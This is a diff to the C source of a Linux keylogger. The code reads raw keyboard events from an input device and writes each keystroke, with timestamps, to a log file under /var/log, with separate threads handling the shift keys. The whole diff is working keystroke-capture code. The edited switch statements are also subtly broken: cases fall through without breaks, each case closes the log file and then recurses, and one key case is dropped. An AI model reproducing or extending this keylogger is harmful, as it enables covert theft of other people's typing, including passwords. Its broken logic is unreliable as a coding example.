@@ -17,9 +17,6 @@
 #include "../../includes/keylogger/log_keys.h"
 #include "../../includes/keylogger/keylogger_utils.h"
 
-//static FILE *file_log = NULL;
-
-//GtkWidget *text_view;
 
 /*  file_log all keyboard keys exept when shift left or right is used.
     Add the date and hours of all keyboard event in the file_log file */
@@ -30,7 +27,7 @@ void *keylogger(char *deviceFile)
     int bytesRead = 0;
     int fd = 0;
 
-    char buffer[108] = {""};
+    char buffer[108] = "";
 
     time_t t = time(NULL);
     struct tm *tm = localtime(&t);
@@ -45,7 +42,13 @@ void *keylogger(char *deviceFile)
     file_log = fopen("/var/log/userlog.log", "a+");
 
     if(file_log == NULL)
+    {
         error("fopen()\nFonction : keylogger()");
+        pthread_exit(NULL);
+    }
+    
+    fputs(buffer, file_log);
+    fputs(" :\n\n", file_log);
 
     printf("deviceFile : %s\n\n", deviceFile);
 
@@ -55,10 +58,6 @@ void *keylogger(char *deviceFile)
 
     setbuf(file_log, NULL);
     
-    fputs("\n\n", file_log);
-    fputs(buffer, file_log);
-    fputs(" : ", file_log);
-
     while(1)
     {
         if((bytesRead = read (fd, &ev, sizeof(struct input_event))) == -1)
@@ -237,51 +236,50 @@ void *Rshift_used(char *deviceFile)
         {
             switch(Rshift_ev.code)
             {
-                case 2 : fputs("1 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 3 : fputs("2 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 4 : fputs("3 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 5 : fputs("4 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 6 : fputs("5 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 7 : fputs("6 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 8 : fputs("7 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 9 : fputs("8 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 10 : fputs("9 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 11 : fputs("0 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 16 : fputs("A ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 17 : fputs("Z ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 18 : fputs("E ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 19 : fputs("R ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 20 : fputs("T ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 21 : fputs("Y ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 22 : fputs("U ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 23 : fputs("I ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 24 : fputs("O ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 25 : fputs("P ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 26 : fputs("¨ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 27 : fputs("£ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 30 : fputs("Q ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 31 : fputs("S ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 32 : fputs("D ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 33 : fputs("F ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 34 : fputs("G ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 35 : fputs("H ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 36 : fputs("J ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 37 : fputs("K ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 38 : fputs("L ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 39 : fputs("M ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 40 : fputs("% ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 43 : fputs("µ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 44 : fputs("W ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 45 : fputs("X ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 46 : fputs("C ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 47 : fputs("V ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 48 : fputs("B ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 49 : fputs("N ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 50 : fputs("? ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 51 : fputs(". ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 52 : fputs("/ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 53 : fputs("§ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 86 : fputs("> ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
+                case 2 : fputs("1 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 3 : fputs("2 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 5 : fputs("4 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 6 : fputs("5 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 7 : fputs("6 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 8 : fputs("7 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 9 : fputs("8 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 10 : fputs("9 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 11 : fputs("0 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 16 : fputs("A ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 17 : fputs("Z ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 18 : fputs("E ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 19 : fputs("R ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 20 : fputs("T ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 21 : fputs("Y ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 22 : fputs("U ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 23 : fputs("I ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 24 : fputs("O ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 25 : fputs("P ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 26 : fputs("¨ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 27 : fputs("£ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 30 : fputs("Q ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 31 : fputs("S ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 32 : fputs("D ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 33 : fputs("F ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 34 : fputs("G ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 35 : fputs("H ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 36 : fputs("J ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 37 : fputs("K ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 38 : fputs("L ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 39 : fputs("M ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 40 : fputs("% ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 43 : fputs("µ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 44 : fputs("W ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 45 : fputs("X ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 46 : fputs("C ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 47 : fputs("V ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 48 : fputs("B ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 49 : fputs("N ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 50 : fputs("? ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 51 : fputs(". ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 52 : fputs("/ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 53 : fputs("§ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 86 : fputs("> ", file_log);   fclose(file_log); keylogger(deviceFile);
                 default : break;
             }
         }
@@ -335,51 +333,51 @@ void *Lshift_used(char *deviceFile)
 
             switch(Lshift_ev.code)
             {
-                case 2 : fputs("1 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 3 : fputs("2 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 4 : fputs("3 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 5 : fputs("4 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 6 : fputs("5 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 7 : fputs("6 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 8 : fputs("7 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 9 : fputs("8 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 10 : fputs("9 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 11 : fputs("0 ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 16 : fputs("A ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 17 : fputs("Z ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 18 : fputs("E ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 19 : fputs("R ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 20 : fputs("T ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 21 : fputs("Y ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 22 : fputs("U ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 23 : fputs("I ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 24 : fputs("O ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 25 : fputs("P ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 26 : fputs("¨ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 27 : fputs("£ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 30 : fputs("Q ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 31 : fputs("S ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 32 : fputs("D ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 33 : fputs("F ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 34 : fputs("G ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 35 : fputs("H ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 36 : fputs("J ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 37 : fputs("K ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 38 : fputs("L ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 39 : fputs("M ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 40 : fputs("% ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 43 : fputs("µ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 44 : fputs("W ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 45 : fputs("X ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 46 : fputs("C ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 47 : fputs("V ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 48 : fputs("B ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 49 : fputs("N ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 50 : fputs("? ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 51 : fputs(". ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 52 : fputs("/ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 53 : fputs("§ ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
-                case 86 : fputs("> ", file_log);   keylogger(deviceFile);__attribute__ ((fallthrough));
+                case 2 : fputs("1 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 3 : fputs("2 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 4 : fputs("3 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 5 : fputs("4 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 6 : fputs("5 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 7 : fputs("6 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 8 : fputs("7 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 9 : fputs("8 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 10 : fputs("9 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 11 : fputs("0 ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 16 : fputs("A ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 17 : fputs("Z ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 18 : fputs("E ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 19 : fputs("R ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 20 : fputs("T ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 21 : fputs("Y ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 22 : fputs("U ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 23 : fputs("I ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 24 : fputs("O ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 25 : fputs("P ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 26 : fputs("¨ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 27 : fputs("£ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 30 : fputs("Q ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 31 : fputs("S ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 32 : fputs("D ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 33 : fputs("F ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 34 : fputs("G ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 35 : fputs("H ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 36 : fputs("J ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 37 : fputs("K ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 38 : fputs("L ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 39 : fputs("M ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 40 : fputs("% ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 43 : fputs("µ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 44 : fputs("W ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 45 : fputs("X ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 46 : fputs("C ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 47 : fputs("V ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 48 : fputs("B ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 49 : fputs("N ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 50 : fputs("? ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 51 : fputs(". ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 52 : fputs("/ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 53 : fputs("§ ", file_log);   fclose(file_log); keylogger(deviceFile);
+                case 86 : fputs("> ", file_log);   fclose(file_log); keylogger(deviceFile);
                 default : break;
             }
         }
@@ -485,7 +483,8 @@ void *Rshift_used_sustained(char *deviceFile)
             }
         }
     }
-
+    
+    fclose(file_log);
     pthread_exit(NULL);
 
     if(pthread_create(&thread_Lshift_key_sustain, NULL, (void*)Lshift_used_sustained, deviceFile) == -1)
@@ -583,6 +582,8 @@ void *Lshift_used_sustained(char *deviceFile)
             }
         }
     }
+    
+    fclose(file_log);
 
     pthread_exit(NULL);
 }
